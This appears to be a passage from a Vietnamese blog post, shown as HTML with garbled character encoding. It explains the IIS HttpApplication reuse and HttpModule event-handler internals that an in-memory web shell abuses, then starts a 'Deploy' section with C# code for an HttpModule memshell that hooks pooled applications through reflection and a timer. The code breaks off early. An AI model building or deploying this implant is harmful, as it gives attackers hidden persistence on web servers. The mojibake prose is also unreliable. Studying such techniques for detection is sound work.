Ã tÆ°á»Ÿng cá»§a ká»¹ thuáº­t nÃ y Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p trong paper cá»§a CrowdStrike vá» framework &lt;a class="link" href="https://www.crowdstrike.com/wp-content/uploads/2022/05/crowdstrike-iceapple-a-novel-internet-information-services-post-exploitation-framework-1.pdf" target="_blank" rel="noopener"
&gt;IceApple&lt;/a&gt; táº¡i module 18, vá»›i má»¥c Ä‘Ã­ch thÃªm má»™t EventHandler vÃ o trong cÃ¡c HttpApplication Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng bá»Ÿi server:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1yOHToB-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="httpapplication-reuse-mechanism"&gt;HttpApplication Reuse Mechanism
&lt;/h3&gt;&lt;p&gt;Táº¡i pháº§n request life cycle, mÃ¬nh Ä‘Ã£ nÃ³i vá» viá»‡c má»™t HttpApplication instance Ä‘Æ°á»£c khá»Ÿi táº¡o, á»Ÿ Ä‘Ã¢y mÃ¬nh sáº½ giáº£i thÃ­ch chi tiáº¿t hÆ¡n viá»‡c nÃ³ Ä‘Æ°á»£c khá»Ÿi táº¡o nhÆ° tháº¿ nÃ o:&lt;br&gt;
Khi HTTP request Ä‘áº¿n server, nhá»¯ng hÃ m tiá»n xá»­ lÃ½ Ä‘Æ°á»£c gá»i Ä‘á»ƒ khá»Ÿi táº¡o HttpContext vÃ  cÃ¡c thÃ´ng tin cáº§n thiáº¿t. Äiá»u nÃ y Ä‘Æ°á»£c thá»±c hiá»‡n thÃ´ng qua 3 hÃ m ProcessRequestNotification trong callstack dÆ°á»›i Ä‘Ã¢y:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJMiBpsHZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Sau Ä‘Ã³, HttpApplicationFactory tiáº¿n hÃ nh láº¥y ra 1 instance cá»§a HttpApplication Ä‘á»ƒ handle HttpContext, viá»‡c lá»±a chá»n vÃ  láº¥y ra nhÆ° tháº¿ nÃ o náº±m táº¡i hÃ m GetNormalApplicationInstance:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1psHTiH-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i hÃ m GetNormalApplicationInstance, HttpApllicationFactory sá»­ dá»¥ng attribute &lt;code&gt;_freeList&lt;/code&gt; chá»©a cÃ¡c object HttpApllication Ä‘Ã£ xá»­ lÃ½ xong request vÃ  Ä‘Æ°á»£c tÃ¡i cháº¿ Ä‘á»ƒ sá»­ dá»¥ng láº¡i. Náº¿u láº¥y Ä‘Æ°á»£c sáº½ tráº£ vá» object httpApplication Ä‘Ã³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ByH0BTorbl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»« Ä‘Ã¢y rÃºt ra Ä‘Æ°á»£c má»™t sá»‘ káº¿t luáº­n vá» HttpApplication nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Má»—i HttpApplication instance Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ 1 request, vÃ  khÃ´ng thá»ƒ bá»‹ can thiá»‡p cho Ä‘áº¿n khi xá»­ lÃ½ xong&lt;/li&gt;
&lt;li&gt;Náº¿u nhÆ° sá»‘ lÆ°á»£ng request gá»­i Ä‘áº¿n nhiá»u hÆ¡n sá»‘ lÆ°á»£ng instance HttpApplication cÃ³ trong &lt;code&gt;_freeList&lt;/code&gt;, viá»‡c táº¡o má»›i Ä‘á»ƒ thá»±c thi ngay hay sá»­ dá»¥ng láº¡i tÃ¹y thuá»™c vÃ o cÆ¡ cháº¿ Ä‘á»“ng bá»™&lt;/li&gt;
&lt;li&gt;Náº¿u nhÆ° sá»­ dá»¥ng .NET Framework lá»›n hÆ¡n 4.5 thÃ¬ máº·c Ä‘á»‹nh cÆ¡ cháº¿ nÃ y Ä‘Æ°á»£c báº­t.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="logic-add-eventhandler-into-httpmodule"&gt;Logic Add EventHandler into HttpModule
&lt;/h3&gt;&lt;p&gt;Tiáº¿p tá»¥c tá»« hÃ m trÆ°á»›c, lÃºc nÃ y HttpModule Ä‘Æ°á»£c khá»Ÿi táº¡o thÃ´ng qua hÃ m hÃ m Init, vÃ  call Ä‘áº¿n cÃ¡c event handler cÃ³ trong module Ä‘Ã³, Ä‘Ã¢y cÅ©ng chÃ­nh lÃ  nhá»¯ng gÃ¬ xáº£y ra trong HTTP Pipeline Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn. Event AuthenticateRequest Ä‘á»©ng ngay sau event Ä‘áº§u tiÃªn BeginRequest - má»™t event dÃ¹ng Ä‘á»ƒ init thuá»™c tÃ­nh nÃªn cÃ³ thá»ƒ coi Ä‘Ã¢y lÃ  event sá»›m nháº¥t Ä‘Æ°á»£c gá»i.&lt;br&gt;
Khi Ä‘Æ°á»£c gá»i, AuthenticateRequest ngay láº­p tá»©c gá»i phÆ°Æ¡ng thá»©c add Ä‘á»ƒ thÃªm má»™t object thuá»™c class EventHandler vÃ o HttpModule:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJK1vTiHZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m AddSyncEventHookup nÃ y thá»±c cháº¥t Ä‘Æ°á»£c thá»±c hiá»‡n vá»›i tham sá»‘ isPostNotification lÃ  false:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJleDajBWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Má»™t HttpApplication cÃ³ nhiá»u HttpModule, lÆ°u trong attribute ModuleContainers - 1 máº£ng cÃ¡c pháº§n tá»­ lÃ  instance cá»§a class PipelineModuleStepContainer.&lt;br&gt;
Äá»ƒ thÃªm Ä‘Æ°á»£c Event vÃ o Ä‘Ãºng module, trÆ°á»›c háº¿t cáº§n pháº£i láº¥y module Ä‘Ã³ ra tá»« ModuleContainers thÃ´ng qua hÃ m GetModuleContainer. EventHandler Ä‘Æ°á»£c Ã©p thÃ nh SyncEventExecutionStep rá»“i má»›i thá»±c hiá»‡n thÃªm event Ä‘Ã³ táº¡i method AddEvent:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Syb2DaoBWl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m AddEvent chá»©a logic chÃ­nh Ä‘á»ƒ thÃªm 1 event vÃ o HttpModule:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/r1ITPToHWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Event Ä‘Æ°á»£c index tÆ°Æ¡ng á»©ng vá»›i tÃªn Ä‘á»ƒ láº¥y ra giÃ¡ trá»‹ sá»‘ nguyÃªn báº±ng EventToIndex. VÃ­ dá»¥ á»Ÿ Ä‘Ã¢y event AuthenticateRequest sáº½ tráº£ vá» giÃ¡ trá»‹ lÃ  1
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ry-W_aiSZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;IIS sáº½ láº¥y ra danh sÃ¡ch cÃ¡c object HttpApplicationIExecutionStep trong máº£ng &lt;code&gt;_moduleSteps&lt;/code&gt; táº¡i vÃ­ trÃ­ thá»© index cá»§a event Ä‘ang xá»­ lÃ½&lt;/li&gt;
&lt;li&gt;Náº¿u list láº¥y ra khÃ¡c rá»—ng, tiáº¿n hÃ nh thÃªm event vÃ o list trÃªn&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="deploy-2"&gt;Deploy
&lt;/h3&gt;&lt;p&gt;Dá»±a vÃ o nhá»¯ng gÃ¬ Ä‘Ã£ tÃ¬m hiá»ƒu, HttpModule memshell cáº§n bao gá»“m:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;HÃ m Loop tiáº¿n hÃ nh inject táº¥t cáº£ cÃ¡c HttpApplication cÃ³ trong &lt;code&gt;_freeList&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Class chÃ­nh sáº½ gá»i Ä‘áº¿n hÃ m Loop sau 1 thá»i gian nháº¥t Ä‘á»‹nh, Ä‘áº£m báº£o cÃ¡c instance HttpApplication má»›i Ä‘Æ°á»£c khá»Ÿi táº¡o cÅ©ng sáº½ bá»‹ inject&lt;/li&gt;
&lt;li&gt;HÃ m InjectHandler cÃ³ nhiá»‡m vá»¥ láº¥y ra ModuleStep thÃ´ng qua hÃ m GetModuleSteps, kiá»ƒm tra náº¿u káº¿t quáº£ tráº£ vá» khÃ¡c null tiáº¿n hÃ nh sá»­ dá»¥ng hÃ m ClearInject Ä‘á»ƒ xÃ³a EventHandler Ä‘Ã£ inject vÃ  thÃªm cÃ¡i má»›i. TrÃ¡nh trÆ°á»ng há»£p chá»‰ thÃªm khiáº¿n thá»±c hiá»‡n cÃ¢u lá»‡nh láº¡i nhiá»u láº§n.&lt;/li&gt;
&lt;li&gt;CÃ¡c class Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘a pháº§n lÃ  private vÃ  internal nÃªn cáº§n sá»­ dá»¥ng reflection khÃ¡ nhiá»u&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;span class="lnt"&gt;44
&lt;/span&gt;&lt;span class="lnt"&gt;45
&lt;/span&gt;&lt;span class="lnt"&gt;46
&lt;/span&gt;&lt;span class="lnt"&gt;47
&lt;/span&gt;&lt;span class="lnt"&gt;48
&lt;/span&gt;&lt;span class="lnt"&gt;49
&lt;/span&gt;&lt;span class="lnt"&gt;50
&lt;/span&gt;&lt;span class="lnt"&gt;51
&lt;/span&gt;&lt;span class="lnt"&gt;52
&lt;/span&gt;&lt;span class="lnt"&gt;53
&lt;/span&gt;&lt;span class="lnt"&gt;54
&lt;/span&gt;&lt;span class="lnt"&gt;55
&lt;/span&gt;&lt;span class="lnt"&gt;56
&lt;/span&gt;&lt;span class="lnt"&gt;57
&lt;/span&gt;&lt;span class="lnt"&gt;58
&lt;/span&gt;&lt;span class="lnt"&gt;59
&lt;/span&gt;&lt;span class="lnt"&gt;60
&lt;/span&gt;&lt;span class="lnt"&gt;61
&lt;/span&gt;&lt;span class="lnt"&gt;62
&lt;/span&gt;&lt;span class="lnt"&gt;63
&lt;/span&gt;&lt;span class="lnt"&gt;64
&lt;/span&gt;&lt;span class="lnt"&gt;65
&lt;/span&gt;&lt;span class="lnt"&gt;66
&lt;/span&gt;&lt;span class="lnt"&gt;67
&lt;/span&gt;&lt;span class="lnt"&gt;68
&lt;/span&gt;&lt;span class="lnt"&gt;69
&lt;/span&gt;&lt;span class="lnt"&gt;70
&lt;/span&gt;&lt;span class="lnt"&gt;71
&lt;/span&gt;&lt;span class="lnt"&gt;72
&lt;/span&gt;&lt;span class="lnt"&gt;73
&lt;/span&gt;&lt;span class="lnt"&gt;74
&lt;/span&gt;&lt;span class="lnt"&gt;75
&lt;/span&gt;&lt;span class="lnt"&gt;76
&lt;/span&gt;&lt;span class="lnt"&gt;77
&lt;/span&gt;&lt;span class="lnt"&gt;78
&lt;/span&gt;&lt;span class="lnt"&gt;79
&lt;/span&gt;&lt;span class="lnt"&gt;80
&lt;/span&gt;&lt;span class="lnt"&gt;81
&lt;/span&gt;&lt;span class="lnt"&gt;82
&lt;/span&gt;&lt;span class="lnt"&gt;83
&lt;/span&gt;&lt;span class="lnt"&gt;84
&lt;/span&gt;&lt;span class="lnt"&gt;85
&lt;/span&gt;&lt;span class="lnt"&gt;86
&lt;/span&gt;&lt;span class="lnt"&gt;87
&lt;/span&gt;&lt;span class="lnt"&gt;88
&lt;/span&gt;&lt;span class="lnt"&gt;89
&lt;/span&gt;&lt;span class="lnt"&gt;90
&lt;/span&gt;&lt;span class="lnt"&gt;91
&lt;/span&gt;&lt;span class="lnt"&gt;92
&lt;/span&gt;&lt;span class="lnt"&gt;93
&lt;/span&gt;&lt;span class="lnt"&gt;94
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt; &lt;span class="n"&gt;runat&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;server&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ModuleMemShell&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Assembly&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpApplication&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Assembly&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;HAFClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.HttpApplicationFactory&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;PipelineModuleStepContainerClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.PipelineModuleStepContainer&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;HttpApplicationClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.HttpApplication&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;PipelineModuleStepContainerArrayClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.PipelineModuleStepContainer[]&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;SyncEventExecutionStepClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.HttpApplication+SyncEventExecutionStep&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;iExecutionStepType&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sysWeb&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;System.Web.HttpApplication+IExecutionStep&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&amp;gt;).&lt;/span&gt;&lt;span class="n"&gt;MakeGenericType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iExecutionStepType&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;ListIExecutionStepArrayClass&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ListIExecutionStepClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MakeArrayType&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Public&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Static&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;ModuleMemShell&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;previous_timer&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;loop&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;previous_timer&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Threading&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;previous_timer&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Dispose&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;timer&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Threading&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Loop&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;3000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;loop&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;timer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;HttpModule Memshell Injected!!!!&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="n"&gt;Loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;stateInfo&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;appFactory&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HAFClass&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;_theApplicationFactory&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;GetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
